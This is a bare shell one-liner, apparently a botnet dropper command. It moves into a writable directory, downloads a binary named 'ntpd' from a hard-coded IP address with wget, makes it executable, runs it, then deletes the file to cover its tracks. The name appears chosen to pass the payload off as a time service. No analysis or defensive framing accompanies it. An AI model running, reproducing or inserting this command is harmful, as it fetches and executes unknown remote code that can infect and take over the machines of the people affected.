cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://122.15.144.150/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
